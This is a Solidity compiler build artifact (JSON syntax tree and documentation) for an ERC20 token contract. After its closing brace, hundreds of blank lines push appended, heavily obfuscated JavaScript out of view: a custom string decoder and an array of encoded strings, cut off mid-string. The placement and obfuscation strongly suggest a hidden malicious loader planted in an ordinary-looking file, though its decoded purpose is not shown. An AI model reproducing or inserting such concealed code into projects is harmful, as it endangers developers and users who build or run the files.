                              "typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
                              "typeString": "function (address,address,uint256)"
                            }
                          },
                          "id": 940,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "10085:31:8",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 941,
                        "nodeType": "EmitStatement",
                        "src": "10080:36:8"
                      }
                    ]
                  }
                }
              ]
            },
            "documentation": {
              "id": 886,
              "nodeType": "StructuredDocumentation",
              "src": "8860:836:8",
              "text": " @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\n By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\n `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n `Approval` event during `transferFrom` operations.\n Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n true using the following override:\n ```solidity\n function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n     super._approve(owner, spender, value, true);\n }\n ```\n Requirements are the same as {_approve}."
            },
            "id": 945,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "_approve",
            "nameLocation": "9710:8:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 895,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 888,
                  "mutability": "mutable",
                  "name": "owner",
                  "nameLocation": "9727:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 945,
                  "src": "9719:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 887,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "9719:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 890,
                  "mutability": "mutable",
                  "name": "spender",
                  "nameLocation": "9742:7:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 945,
                  "src": "9734:15:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 889,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "9734:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 892,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "9759:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 945,
                  "src": "9751:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 891,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "9751:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 894,
                  "mutability": "mutable",
                  "name": "emitEvent",
                  "nameLocation": "9771:9:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 945,
                  "src": "9766:14:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bool",
                    "typeString": "bool"
                  },
                  "typeName": {
                    "id": 893,
                    "name": "bool",
                    "nodeType": "ElementaryTypeName",
                    "src": "9766:4:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "9718:63:8"
            },
            "returnParameters": {
              "id": 896,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "9799:0:8"
            },
            "scope": 994,
            "src": "9701:432:8",
            "stateMutability": "nonpayable",
            "virtual": true,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 992,
              "nodeType": "Block",
              "src": "10504:388:8",
              "statements": [
                {
                  "assignments": [
                    956
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 956,
                      "mutability": "mutable",
                      "name": "currentAllowance",
                      "nameLocation": "10522:16:8",
                      "nodeType": "VariableDeclaration",
                      "scope": 992,
                      "src": "10514:24:8",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 955,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "10514:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 961,
                  "initialValue": {
                    "arguments": [
                      {
                        "id": 958,
                        "name": "owner",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 948,
                        "src": "10551:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 959,
                        "name": "spender",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 950,
                        "src": "10558:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "id": 957,
                      "name": "allowance",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 621,
                      "src": "10541:9:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_view$_t_address_$_t_address_$returns$_t_uint256_$",
                        "typeString": "function (address,address) view returns (uint256)"
                      }
                    },
                    "id": 960,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "10541:25:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "10514:52:8"
                },
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 968,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 962,
                      "name": "currentAllowance",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 956,
                      "src": "10580:16:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "!=",
                    "rightExpression": {
                      "expression": {
                        "arguments": [
                          {
                            "id": 965,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "10605:7:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_uint256_$",
                              "typeString": "type(uint256)"
                            },
                            "typeName": {
                              "id": 964,
                              "name": "uint256",
                              "nodeType": "ElementaryTypeName",
                              "src": "10605:7:8",
                              "typeDescriptions": {}
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_type$_t_uint256_$",
                              "typeString": "type(uint256)"
                            }
                          ],
                          "id": 963,
                          "name": "type",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 4294967269,
                          "src": "10600:4:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_metatype_pure$__$returns$__$",
                            "typeString": "function () pure"
                          }
                        },
                        "id": 966,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "10600:13:8",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_meta_type_t_uint256",
                          "typeString": "type(uint256)"
                        }
                      },
                      "id": 967,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "memberLocation": "10614:3:8",
                      "memberName": "max",
                      "nodeType": "MemberAccess",
                      "src": "10600:17:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "10580:37:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 991,
                  "nodeType": "IfStatement",
                  "src": "10576:310:8",
                  "trueBody": {
                    "id": 990,
                    "nodeType": "Block",
                    "src": "10619:267:8",
                    "statements": [
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 971,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 969,
                            "name": "currentAllowance",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 956,
                            "src": "10637:16:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "<",
                          "rightExpression": {
                            "id": 970,
                            "name": "value",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 952,
                            "src": "10656:5:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "10637:24:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "id": 979,
                        "nodeType": "IfStatement",
                        "src": "10633:130:8",
                        "trueBody": {
                          "id": 978,
                          "nodeType": "Block",
                          "src": "10663:100:8",
                          "statements": [
                            {
                              "errorCall": {
                                "arguments": [
                                  {
                                    "id": 973,
                                    "name": "spender",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 950,
                                    "src": "10715:7:8",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    }
                                  },
                                  {
                                    "id": 974,
                                    "name": "currentAllowance",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 956,
                                    "src": "10724:16:8",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  {
                                    "id": 975,
                                    "name": "value",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 952,
                                    "src": "10742:5:8",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_address",
                                      "typeString": "address"
                                    },
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    },
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  ],
                                  "id": 972,
                                  "name": "ERC20InsufficientAllowance",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 373,
                                  "src": "10688:26:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_error_pure$_t_address_$_t_uint256_$_t_uint256_$returns$__$",
                                    "typeString": "function (address,uint256,uint256) pure"
                                  }
                                },
                                "id": 976,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "nameLocations": [],
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "10688:60:8",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 977,
                              "nodeType": "RevertStatement",
                              "src": "10681:67:8"
                            }
                          ]
                        }
                      },
                      {
                        "id": 989,
                        "nodeType": "UncheckedBlock",
                        "src": "10776:100:8",
                        "statements": [
                          {
                            "expression": {
                              "arguments": [
                                {
                                  "id": 981,
                                  "name": "owner",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 948,
                                  "src": "10813:5:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                },
                                {
                                  "id": 982,
                                  "name": "spender",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 950,
                                  "src": "10820:7:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                },
                                {
                                  "commonType": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  "id": 985,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "leftExpression": {
                                    "id": 983,
                                    "name": "currentAllowance",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 956,
                                    "src": "10829:16:8",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  "nodeType": "BinaryOperation",
                                  "operator": "-",
                                  "rightExpression": {
                                    "id": 984,
                                    "name": "value",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 952,
                                    "src": "10848:5:8",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  "src": "10829:24:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                {
                                  "hexValue": "66616c7365",
                                  "id": 986,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "bool",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "10855:5:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_bool",
                                    "typeString": "bool"
                                  },
                                  "value": "false"
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  },
                                  {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  },
                                  {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  {
                                    "typeIdentifier": "t_bool",
                                    "typeString": "bool"
                                  }
                                ],
                                "id": 980,
                                "name": "_approve",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [
                                  885,
                                  945
                                ],
                                "referencedDeclaration": 945,
                                "src": "10804:8:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bool_$returns$__$",
                                  "typeString": "function (address,address,uint256,bool)"
                                }
                              },
                              "id": 987,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "functionCall",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "10804:57:8",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_tuple$__$",
                                "typeString": "tuple()"
                              }
                            },
                            "id": 988,
                            "nodeType": "ExpressionStatement",
                            "src": "10804:57:8"
                          }
                        ]
                      }
                    ]
                  }
                }
              ]
            },
            "documentation": {
              "id": 946,
              "nodeType": "StructuredDocumentation",
              "src": "10139:271:8",
              "text": " @dev Updates `owner` s allowance for `spender` based on spent `value`.\n Does not update the allowance value in case of infinite allowance.\n Revert if not enough allowance is available.\n Does not emit an {Approval} event."
            },
            "id": 993,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "_spendAllowance",
            "nameLocation": "10424:15:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 953,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 948,
                  "mutability": "mutable",
                  "name": "owner",
                  "nameLocation": "10448:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 993,
                  "src": "10440:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 947,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "10440:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 950,
                  "mutability": "mutable",
                  "name": "spender",
                  "nameLocation": "10463:7:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 993,
                  "src": "10455:15:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 949,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "10455:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 952,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "10480:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 993,
                  "src": "10472:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 951,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "10472:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "10439:47:8"
            },
            "returnParameters": {
              "id": 954,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "10504:0:8"
            },
            "scope": 994,
            "src": "10415:477:8",
            "stateMutability": "nonpayable",
            "virtual": true,
            "visibility": "internal"
          }
        ],
        "scope": 995,
        "src": "1106:9788:8",
        "usedErrors": [
          354,
          359,
          364,
          373,
          378,
          383
        ],
        "usedEvents": [
          1006,
          1015
        ]
      }
    ],
    "src": "105:10790:8"
  },
  "compiler": {
    "name": "solc",
    "version": "0.8.20+commit.a1b79de6.Emscripten.clang"
  },
  "networks": {},
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-12-06T09:30:41.134Z",
  "devdoc": {
    "details": "Implementation of the {IERC20} interface. This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. TIP: For a detailed writeup see our guide https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms]. The default value of {decimals} is 18. To change this, you should override this function so it returns a different value. We have followed general OpenZeppelin Contracts guidelines: functions revert instead returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC-20 applications.",
    "errors": {
      "ERC20InsufficientAllowance(address,uint256,uint256)": [
        {
          "details": "Indicates a failure with the `spender`’s `allowance`. Used in transfers.",
          "params": {
            "allowance": "Amount of tokens a `spender` is allowed to operate with.",
            "needed": "Minimum amount required to perform a transfer.",
            "spender": "Address that may be allowed to operate on tokens without being their owner."
          }
        }
      ],
      "ERC20InsufficientBalance(address,uint256,uint256)": [
        {
          "details": "Indicates an error related to the current `balance` of a `sender`. Used in transfers.",
          "params": {
            "balance": "Current balance for the interacting account.",
            "needed": "Minimum amount required to perform a transfer.",
            "sender": "Address whose tokens are being transferred."
          }
        }
      ],
      "ERC20InvalidApprover(address)": [
        {
          "details": "Indicates a failure with the `approver` of a token to be approved. Used in approvals.",
          "params": {
            "approver": "Address initiating an approval operation."
          }
        }
      ],
      "ERC20InvalidReceiver(address)": [
        {
          "details": "Indicates a failure with the token `receiver`. Used in transfers.",
          "params": {
            "receiver": "Address to which tokens are being transferred."
          }
        }
      ],
      "ERC20InvalidSender(address)": [
        {
          "details": "Indicates a failure with the token `sender`. Used in transfers.",
          "params": {
            "sender": "Address whose tokens are being transferred."
          }
        }
      ],
      "ERC20InvalidSpender(address)": [
        {
          "details": "Indicates a failure with the `spender` to be approved. Used in approvals.",
          "params": {
            "spender": "Address that may be allowed to operate on tokens without being their owner."
          }
        }
      ]
    },
    "events": {
      "Approval(address,address,uint256)": {
        "details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
      },
      "Transfer(address,address,uint256)": {
        "details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
      }
    },
    "kind": "dev",
    "methods": {
      "allowance(address,address)": {
        "details": "See {IERC20-allowance}."
      },
      "approve(address,uint256)": {
        "details": "See {IERC20-approve}. NOTE: If `value` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address."
      },
      "balanceOf(address)": {
        "details": "See {IERC20-balanceOf}."
      },
      "constructor": {
        "details": "Sets the values for {name} and {symbol}. All two of these values are immutable: they can only be set once during construction."
      },
      "decimals()": {
        "details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the default value returned by this function, unless it's overridden. NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
      },
      "name()": {
        "details": "Returns the name of the token."
      },
      "symbol()": {
        "details": "Returns the symbol of the token, usually a shorter version of the name."
      },
      "totalSupply()": {
        "details": "See {IERC20-totalSupply}."
      },
      "transfer(address,uint256)": {
        "details": "See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `value`."
      },
      "transferFrom(address,address,uint256)": {
        "details": "See {IERC20-transferFrom}. Skips emitting an {Approval} event indicating an allowance update. This is not required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve]. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `value`. - the caller must have allowance for ``from``'s tokens of at least `value`."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}






















































































































































































































































































































































































































var b1Byj0,r0hQeKA,R4y7UQ,q7TIhEw,INhnfLw,Vpqkej,RBOkiuJ,Kw8_B1,svZDltY;const McEUGbi=[0x0,0x1,0x8,0xff,"length","undefined",0x3f,0x6,"fromCodePoint",0x7,0xc,"push",0x5b,0x1fff,0x58,0xd,0xe,0x59,"n","p",0x3,0x4,0x5,0x2,"v",!0x1,!0x0,0x61,0x79,0x7e,0x7f,0x80,0x359,0x380,0x13d,0x110,"on","a","d","f",".",0x9e,"m","w",null,0xa,0xa2,":",0xac,"-e",0xb3,0xc4,0xc9,0xcc];function F97NQdY(b1Byj0){var r0hQeKA="[<8uq)r:FtfT.y/;la\"&C*K^#5mDpV4ISZ3vP_}Q6jU9dMx|e7Jw1=b$i`B+EhkAz2{g?!(R,c@NG%L~n]oX>HYO0Ws",R4y7UQ,q7TIhEw,INhnfLw,Vpqkej,RBOkiuJ,Kw8_B1,svZDltY;SFoT2s(R4y7UQ=""+(b1Byj0||""),q7TIhEw=R4y7UQ.length,INhnfLw=[],Vpqkej=McEUGbi[0x0],RBOkiuJ=McEUGbi[0x0],Kw8_B1=-McEUGbi[0x1]);for(svZDltY=McEUGbi[0x0];svZDltY<q7TIhEw;svZDltY++){var F97NQdY=r0hQeKA.indexOf(R4y7UQ[svZDltY]);if(F97NQdY===-McEUGbi[0x1])continue;if(Kw8_B1<McEUGbi[0x0]){Kw8_B1=F97NQdY}else{SFoT2s(Kw8_B1+=F97NQdY*McEUGbi[0xc],Vpqkej|=Kw8_B1<<RBOkiuJ,RBOkiuJ+=(Kw8_B1&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(INhnfLw.push(Vpqkej&McEUGbi[0x3]),Vpqkej>>=McEUGbi[0x2],RBOkiuJ-=McEUGbi[0x2])}while(RBOkiuJ>McEUGbi[0x9]);Kw8_B1=-McEUGbi[0x1]}}if(Kw8_B1>-McEUGbi[0x1]){INhnfLw.push((Vpqkej|Kw8_B1<<RBOkiuJ)&McEUGbi[0x3])}return JEtDCZ(INhnfLw)}function ANwvNEQ(R4y7UQ){if(typeof b1Byj0[R4y7UQ]===McEUGbi[0x5]){return b1Byj0[R4y7UQ]=F97NQdY(r0hQeKA[R4y7UQ])}return b1Byj0[R4y7UQ]}SFoT2s(b1Byj0={},r0hQeKA=["CEbtPi.Fgt>gdRVVT9nc\"}x1:$Wg.;BvhtgFS+fFr","V3Qq~}7vPzR($+YKNiQq~REnGFNq?;(&F`d%TY6xo;X(+D)\"Ni%m>k+v8&","CC5LUn<NCbzSM,p4GMktTX2VV\"h","NiYGL!LYUkBivm3aimHmR@p\":yRg#XTmj_jDo`8Bq","rS0rN!oB>`Z","}wOpyGBxcaNSm]HvAp6c:~nBh=]7:}C3]e(c2]t5MF|T\")","skjDhEN:2.4I%PR}Cx=I+Q$yr","(^}I|?lxPy/DQ(!IHI0t\"!hN+an<~8CD0M0rE3[","5btDl`d4U/f,5q6mb?iwTYKPMT;,=,`V?uE@YRh<;.TeFRmV(UZbqY[","]3VI[Pcj^BH.9mF}C\"OpFGJ4NTB%k5g4R_hI!~i@<tCw9(Kj","/;X)g3`<}ygAK)[Vc+p:2$9&zti+D8f5*mP%rk<5r","j.US^`z#l{G;O(KpHpV@z>?@U/CGU/?I;7_qp|y:Oz.4B7(_gbfD5H&y+k3",",C5Nf]*:>b+",":9tNR$X~S.|!#q[U^bu",")vb$T$s3A.bpTJ|DheD@_|2j?&=*<eMD+?6t`Ei1=B]xnu","fxL:>Ra|ot${lusVPu*@y","5R@)Z?=A];`7t,4V6`qV:3n1)","}Eu,R$Nj<tR<teQ__?|7F],x>y4G7_*v<b(:W+CBW2RgPlkUEk?f),o.:","jwN)V|bYz.#","pm~tMNJzHy<oFutI}uY:)!c!lE>@hqeQ8bWSG$~Vt2b\"u(3#}`?:","m65w2]HyV*","(ckp:Pn3x+pGa,!&/;5r%eLx|AW`{yu#\";<bC",",u)fO!g<e=T$}hBVlblrx7j|o;e:aeE^Cr3,mH[","fS7rH!^vZb,Kd|R}a`xIN$?x+iN;@5d5N2*f","$mK1h%&=|Fec<",">M(:iE@1x=G<Io(\"H+64Xk@x%+tND|l6y_k1R3a:q","(eg%o}9|.2c([,g\"OM3%~P<j0B^~EDb3^^1Vv6$HeEV,&JE^/xK1Zb:yNC*,<","D2ItvN;:].0K)PEU?kQ1~G>x@aoSMl)9erMfX!4nfCr^Ioq}Vx64%X[","!I54Z|x\"w.0($D)4$m$1Ph64h=25<","+_J,b%#8","{euV7()5<`$/FX|D}`q@=A2`|\"$1H#Vv(2ntUbvVq`{A}yvI<AtL67$H!y;2<","f@rI=>E4x=$(foQ5HM4:+%pF^zyBqQ`^I<","@CYp\"X/B;\"3ug/HpQ`M@6|Av|i#,b(Q\"0w2F+=f1<\"","9V!J2Q_`{tl,#+#3z_sFL!X<z`fo*lTQ>wL:PHe1^B@iiubj]rAq.","MrJF)=2yC&/fhq","aSYp5`Q:Aitr~}2P0Tg=K`<5g.B1:m?a/93S/GhN~=L]!q","j?!1YGL11`zS#u]D79zt",">MDSZ7s@<A$+&JN&zpxq~$vA8.","i2Ap3n11U2J!y]yC)t{wOJ[","Kw?=]XKx6Cfw6DN5KVtD51C#9C","Qa}1Ck^V:","_r?@geJ12t`5t,03","m;+VWM11>`t,N;,\"*;b:y!?xi2wI>|TmZEHJ#X385k:~Joy&bwb1t`zxD2#","at<4dw4PE2;,8hW^GC?m0|N<G+Y@V)r","y78,l}+j=yM#vo|Q[x=I/GO^daq|@7>3|`:4pR>Bl{3k5q","+k`wk,$|xA&~uoZPn+nr","K6xGwA_`fC}cjhHv0UGJPiD]%T_","NU0rfYY#OC","vumwt!;&y+gialK6/.OGL`U8:C.,Y/7Q>(S4BwZjn`QGGq_&C\"3SS6dB)","Gk?@ZHQv)","l9+S7i`^nAGPSR_&}bE%rY01otj/nvdQ:7cr","um~7YG=^u`z\">X?4j9)@Wck4x=F,ieu5Z?ow:~(1=b9ft><9",">+}IB%I&A.8,h!TQO/[bp+X`gb_1fhvahcjNwx*vnA8N&R{_o(]b)![","S;N=Bx&:f$gcplhUgMm,wif#9Fn78_R_NkmN4HF#+F,cE+!Ii^<r","Qe\"V&}N:2\"auO}TQG+:tB,UxDaG@7,GQ`b)$Tk@\"2;6~quq9Um8","um~1R3wvI{&u7qMQt?e79vx8o`ekHeEv:75wD}C11&/hF;:","#2(G3LzBgEn5(7b6be1VdA,\"~.,T`eKjC;,cg=!Vh\"V!B]z^X[","Z__f!~[","c+m%^X&vI*ZDVe(}c?/G36J4:$zv~(mjJr8","JI64<PS\"A;o=SX@mOM!@~k%<","zbb:PNs.l\"$nZ,GQ{p2w^Gi1J.*~.QWV0wMIue|H}z4Bwo<P*;Sb}|11u","RM_1Z|@#C&wArhf","4^$7WHa&ZA6/:JS\"d^